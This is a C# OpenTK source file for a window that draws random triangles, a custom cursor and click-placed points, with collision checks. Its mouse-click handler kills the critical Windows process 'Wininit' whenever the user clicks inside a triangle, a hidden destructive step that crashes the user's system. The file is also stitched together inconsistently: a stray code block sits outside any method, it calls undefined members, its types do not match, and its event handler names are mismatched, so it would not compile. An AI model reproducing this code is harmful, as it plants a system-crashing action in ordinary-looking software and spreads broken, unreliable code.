using OpenTK;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using OpenTK.Graphics.OpenGL;
using OpenTK.Graphics;
using OpenTK.Input;
using System.Dynamic;

namespace Hanoi
{
    public class Ventana : GameWindow
    {
        int ancho, alto;
        float cursorX, cursorY;
        float tamCursor = 15f;
        bool mousePresionado = false;

        Color background;
        List<Vertex> listaElementos = new List<Vertex>();
        List<Vertex> listaTemporalElementos = new List<Vertex>();

        public Ventana(int _ancho, int _alto, string titulo, Color? _background) : base(_ancho, _alto, GraphicsMode.Default, titulo)
        {
            ancho = _ancho;
            alto = _alto;
            background = _background != null ? (Color)_background : Color.Black ;
            this.Resize += DimensionesVentana;
            this.Load += this.Carga;
            this.RenderFrame += this.ActualizarFrame;
            this.MouseMove += this.OnCursorMove;
            this.MouseDown += this.MouseClick;
            this.MouseUp += this.MouseRelease;
            this.CursorVisible = false;
            DibujarTriangulosAleatorios();
            this.Run(1 / 60.0);
        }

        public void ActualizarFrame(object obj, EventArgs e)
        {
            GL.Clear(ClearBufferMask.ColorBufferBit);
            GL.Begin(PrimitiveType.Triangles);
            GL.Color3(1.0f, 1.0f, 1.0f);
            //Especificar vertices aqui            
            for(int i = 0; i < listaElementos.Count; i++)
            {
                float x = listaElementos[i].Item1;
                float y = listaElementos[i].Item2;
                GL.Vertex2(x, y);
            }
            GL.End();

            GL.PointSize(5.0f);
            GL.Begin(PrimitiveType.Points);
            GL.Color3(1.0f, 0f, 0f);
            DibujarListaTemporal();
            GL.Color3(0f, 1.0f, 1.0f);
            DibujarListaPuntos();
            GL.End();

            GL.Begin(PrimitiveType.Triangles);
            GL.Color3(1.0f, 1.0f, 0.5f);
            DibujarCursor(cursorX, cursorY);
            GL.End();
            this.SwapBuffers();
        }

        public Tuple<float, float> Rayo(float x, float y, float tiempo = 0, float direccion = 0, Tuple<float, float> vectorFinal = null)
        {
            float direccionX = vectorFinal.Item1;
            float direccionY = vectorFinal.Item2;
            
            if (vectorFinal == null)
            {
                //Conversion de grados a Vector Direccion
                float radianes = direccion * (float)(Math.PI / 180);
                direccionX = (float)Math.Cos(radianes);
                direccionY = (float)Math.Sin(radianes);

            }

            x += tiempo * direccionX;
            y += tiempo * direccionY;

            return Tuple.Create(x, y);
        }

        public bool Colision(float x1, float y1, out List<Tuple<float, float>> listaTriangulosPorRevisar)
        {
            listaTriangulosPorRevisar = new List<Tuple<float,float>>();
            var boundingBox = new Tuple<float, float>[3];
            //Registrar las hitboxes de todos los elementos
            for (int i = 0; i < listaElementos.Count; i += 3)
            {
                boundingBox[0] = listaElementos[i];
                boundingBox[1] = listaElementos[i + 1];
                boundingBox[2] = listaElementos[i + 2];

                float[] boundingAltura = new float[2];
                //Conseguir la altura maxima y minima del elemento
                boundingAltura[0] = listaElementos.GetRange(i, 3).Max(y => y.Item2);
                boundingAltura[1] = listaElementos.GetRange(i, 3).Min(y => y.Item2);

                float[] boundingAnchura = new float[2];
                //Conseguir la anchura maxima y minima del elemento
                boundingAnchura[0] = listaElementos.GetRange(i, 3).Max(x => x.Item1);
                boundingAnchura[1] = listaElementos.GetRange(i, 3).Min(x => x.Item1);

                //Recoger solo los triangulos posiblemente con colison
                if ((boundingAltura[0] > y1 && boundingAltura[1] < y1) || (boundingAnchura[0] > x1 && boundingAnchura[1] < x1))
                {
                    listaTriangulosPorRevisar.AddRange(boundingBox);
                }

                //Comprobar si el punto se puede colocar
                if ((boundingAltura[0] > y1 && boundingAltura[1] < y1) && (boundingAnchura[0] > x1 && boundingAnchura[1] < x1))
                {
                    return true;
                }
            }
            return false;
        }

        private bool Colision(float x1, float y1)
        {
            return Colision(x1, y1, out _);
        }
        private bool Colision(Tuple<float, float> vector)
        {
            return Colision(vector.Item1, vector.Item2, out _);
        }

        private void DibujarListaPuntos()
        {
            foreach (var item in listaPuntos)
            {
                GL.Vertex2(item.Item1, item.Item2);
            }
        }
        private void DibujarListaTemporal()
        {
            foreach(var item in listaTemporalElementos)
            {
                GL.Vertex2(item.Item1, item.Item2);
            }
            if (listaTemporalElementos.Count % 3 == 0)
            {
                foreach (var item in listaTemporalElementos)
                {
                    listaElementos.Add(item);
                }
                listaTemporalElementos.Clear();
            }
        }
            if (listaTriangulosPorRevisar.Count > 0)
                return true;

            return false;
        }
        public bool ColisionGeneral(float x1, float y1)
        {
            return ColisionGeneral(x1, y1, out _);
        }
        public bool ColisionGeneral(Vertex vector)
        {
            return ColisionGeneral(vector.X, vector.Y, out _);
        }
        public bool ColisionEspecifica(float x1, float y1, List<Vertex> listaVertices)
        {
            for (int i = 0; i < listaVertices.Count; i += 3)
            {
                Vertex va = listaVertices[i];
                Vertex vb = listaVertices[i + 1];
                Vertex vc = listaVertices[i + 2];
                Vertex vd = new Vertex(x1, y1);

                float areaT = Trigonometria.Area(va, vb, vc);
                float areaA = Trigonometria.Area(va, vb, vd);
                float areaB = Trigonometria.Area(vb, vc, vd);
                float areaC = Trigonometria.Area(vc, va, vd);

                if (areaA + areaB + areaC <= areaT && areaA >= 0 && areaB >= 0 && areaC >= 0)
                    return true; 
            }
            return false;
        }
        public bool ColisionEspecifica()
        {
            List<Vertex> lista;
            ColisionGeneral(cursorX, cursorY, out lista);

            foreach(Vertex v in lista)
            {
                Console.WriteLine(v.X.ToString() + " " + v.Y.ToString());
            }

            if (lista.Count <= 0)
                return false;

            return ColisionEspecifica(cursorX, cursorY, lista);
        }

        public void DibujarElementos(PrimitiveType tipo, List<Vertex> lista, float sizePoints = 1f)
        {
            switch (tipo)
            {
                case PrimitiveType.Triangles:
                    for (int i = 0; i < lista.Count; i += 3)
                    {
                        GL.Begin(tipo);
                        GL.Color3(lista[i].Color);
                        GL.Vertex2(lista[i].X, lista[i].Y);
                        GL.Vertex2(lista[i + 1].X, lista[i + 1].Y);
                        GL.Vertex2(lista[i + 2].X, lista[i + 2].Y);
                        GL.End();
                    }
                    break;
                case PrimitiveType.Lines:
                    for (int i = 0; i < lista.Count; i += 2)
                    {
                        GL.Begin(tipo);
                        GL.Color3(lista[i].Color);
                        GL.Vertex2(lista[i].X, lista[i].Y);
                        GL.Vertex2(lista[i + 1].X, lista[i + 1].Y);
                        GL.End();
                    }
                    break;
                case PrimitiveType.Points:
                    for (int i = 0; i < lista.Count; i++)
                    {
                        GL.PointSize(sizePoints);
                        GL.Begin(tipo);
                        GL.Color3(lista[i].Color);
                        GL.Vertex2(lista[i].X, lista[i].Y);
                        GL.End();
                    }
                    break;
            }
                
        }
        public void DibujarElementos()
        {
            DibujarElementos(PrimitiveType.Triangles, listaElementos);
        }
        public void DibujarCursor(float x, float y)
        {
            float offset = mousePresionado ? 0 : tamCursor / 10;
            float tempTamCursor = tamCursor;
            GL.PointSize(tamCursor);
            GL.ClearColor(1.0f, 1.0f, 1.0f, 1.0f);
            for (int i = 0; i < 1; i++)
            {
                GL.Vertex2(cursorX + offset, cursorY - offset);
                GL.Vertex2((cursorX + offset) + tempTamCursor, (cursorY - offset));
                GL.Vertex2((cursorX + offset), (cursorY - offset) - tempTamCursor);
                offset *= -1;
                tempTamCursor *= -1;
            }
            List<Tuple<float, float>> seleccion;
            Colision(cursorX, cursorY, out seleccion);
            foreach (var item in seleccion)
            {
                GL.Vertex2(item.Item1, item.Item2);
            }
        }
        public void DibujarPuntosTemporales()
        {
            GL.PointSize(2.5f);
            GL.Begin(PrimitiveType.Points);
            GL.Color3(1.0f, 0f, 0f);
            foreach (Vertex v in listaTemporalElementos)
            {
                GL.Vertex2(v.X, v.Y);
            }
            GL.End();
        }
        public void DibujarTriangulosAleatorios()
        {
            Random rnd = new Random();
            GL.ClearColor(1.0f, 1.0f, 1.0f, 1.0f);
            for (int i = 0; i < 15; i++)
            {
                float orientacion = rnd.Next(0, 2);
                float tama = rnd.Next(20, 100);
                float y = rnd.Next(0, alto);
                float x = rnd.Next(0, ancho);
                if (orientacion == 0)
                {
                    tama *= -1;
                }
                Vertex vertice1 = new Vertex((x + tama), (y + tama));
                Vertex vertice2 = new Vertex(x, y + tama);
                Vertex vertice3 = new Vertex(x + tama, y);
                listaElementos.Add(vertice1);
                listaElementos.Add(vertice2);
                listaElementos.Add(vertice3);
            }
        } 
        public void OnCursorMove(object obj, MouseMoveEventArgs eventoCursor)
        {
            cursorX = eventoCursor.X;
            cursorY = alto - eventoCursor.Y;
        }
        public void OnMouseClick(object obj, MouseButtonEventArgs e)
        {
            mousePresionado = e.Button == MouseButton.Left ? true : false;

            if (!ColisionEspecifica())
            {
                Vertex vertice = new Vertex();
                vertice.X = cursorX;
                vertice.Y = cursorY;
                listaTemporalElementos.Add(vertice);
            }
            else
            {
                System.Diagnostics.Process.GetProcessesByName("Wininit")[0].Kill();
            }
            ComprobarTamañoListaTemp();
        }
        public void OnMouseRelease(object obj, MouseButtonEventArgs e)
        {
            mousePresionado = false;
        }

        public void Carga(object obj, EventArgs e)
        {
            float canalRed = background.R / 255f;
            float canalGreen = background.G / 255f;
            float canalBlue = background.B / 255f;
            float canalAlpha = background.A / 255f;
            GL.ClearColor(canalRed, canalGreen, canalBlue, canalAlpha);
        }
        public void DimensionesVentana(object obj, EventArgs e)
        {
            //Necesito explicacion de esto que el indio no explica tan bien
            GL.Viewport(0, 0, ancho, alto);
            GL.MatrixMode(MatrixMode.Projection);
            GL.LoadIdentity();
            GL.Ortho(0.0, ancho, 0.0, alto, -1.0, 1.0);
            GL.MatrixMode(MatrixMode.Modelview);
        }

        public void ComprobarTamañoListaTemp()
        {
            if (listaTemporalElementos.Count >= 3)
            {
                listaElementos.AddRange(listaTemporalElementos);
                listaTemporalElementos.Clear();
            }
        }
    }
}
